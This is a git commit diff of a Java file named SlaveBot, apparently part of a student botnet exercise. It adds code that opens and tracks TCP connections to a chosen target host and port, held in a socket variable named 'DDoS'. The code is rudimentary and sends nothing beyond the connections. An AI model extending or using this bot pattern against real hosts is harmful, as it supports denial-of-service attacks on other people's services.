7493ba96bdc39a35d5c61c219bd792deb9f61afb
Akshay Kotecha Jain <akshay.kotechajain@gmail.com>
2017-03-02 23:37:10 -0800

    Update SlaveBot.java

--- SlaveBot.java
+++ SlaveBot.java
@@ -1,10 +1,13 @@
 import java.net.*;
 import java.util.*;
 import java.io.*;
-import java.text.*;
 
 public class SlaveBot
 {
+	//variable declarations
+	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();
+	Socket DDoS;
+	
 	// main
 	public static void main(String[] args) 
 	{
@@ -36,7 +39,6 @@ public class SlaveBot
 			{
 				e.printStackTrace();
 			}
-				
 		}
 		
 		//for connection done by the command line
@@ -44,19 +46,43 @@ public class SlaveBot
 		{
 			Scanner reader = new Scanner(System.in);
 			String line = reader.nextLine();
-			
 			String[] dataArray = line.split("\\s+");
+			
+			// loop if no data is entered
+			if (line.equals("")) 
+			{
+				continue;
+			}
+			// display ArrayList of Clients
+			else if (line.equalsIgnoreCase("connectedToRemoteHost")) 
+			{
+				System.out.println(connectedToRemoteHost);
+				continue;
+			}
+			//exit function logic
+			else if (line.equalsIgnoreCase("exit") || line.equalsIgnoreCase("quit") || line.equalsIgnoreCase("-1"))
+			{
+				System.out.println("Program Terminated.");
+				System.exit(0);
+			}
 			// input format example = -h localhost -p 9999
-			if(dataArray.length == 4)
+			else if(dataArray.length == 4)
 			{
 				ip = dataArray[1];
 				port = Integer.parseInt(dataArray[3]);
 			}
 			//input format example = -h localhost 9999
-			if(dataArray.length == 3)
+			else if(dataArray.length == 3)
 			{
 				ip = dataArray[1];
 				port = Integer.parseInt(dataArray[2]);
+			}
+			//for random input format
+			else
+			{
+				System.out.println(dataArray);
+				System.out.println("in else");
+				continue;
 			}
 			
 			try
@@ -71,4 +97,50 @@ public class SlaveBot
 	}
 	//main
 	//-----------------------------------------------------------------------------------------------------------------------------------------------
+	//connect
+	public void connect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
+	{
+		try
+		{
+			DDoS = new Socket();
+			DDoS.connect(new InetSocketAddress(targetIP, targetPort));
+			if(DDoS.isConnected())
+			{
+				connectedToRemoteHost.add(DDoS);
+				System.out.println("Client " + selectedSlave.getRemoteSocketAddress() + " connected to " + DDoS.getInetAddress() + " using port " + DDoS.getPort());
+			}
+			
+		} catch(IOException e)
+		{
+			System.out.println("Connection Lost.");
+			e.printStackTrace();
+		}
+	}
+	//connect
+	//-----------------------------------------------------------------------------------------------------------------------------------------------
+	//disconnect
+	public void disconnect(Socket selectedSlave, String targetIPAddress, int targetPort) throws IOException
+	{
+		try
+		{
+			System.out.println(connectedToRemoteHost + "\n\n");
+			System.out.println(selectedSlave.getLocalPort() + "\n\n");
+			for(int i=0; i<connectedToRemoteHost.size(); i++)
+			{
+				if(connectedToRemoteHost.get(i).getLocalPort() == selectedSlave.getLocalPort())
+				{
+						System.out.println("Connection to "+connectedToRemoteHost.get(i).getRemoteSocketAddress()+" "+connectedToRemoteHost.get(i).getLocalPort()+" is closed.");
+						connectedToRemoteHost.get(i).close();
+						connectedToRemoteHost.remove(i);
+						break;
+				}
+			}
+			
+		} catch(IOException e)
+		{
+			System.out.println("Disconnection Failure.");
+			e.printStackTrace();
+		}
+	}
+	//disconnect
 }
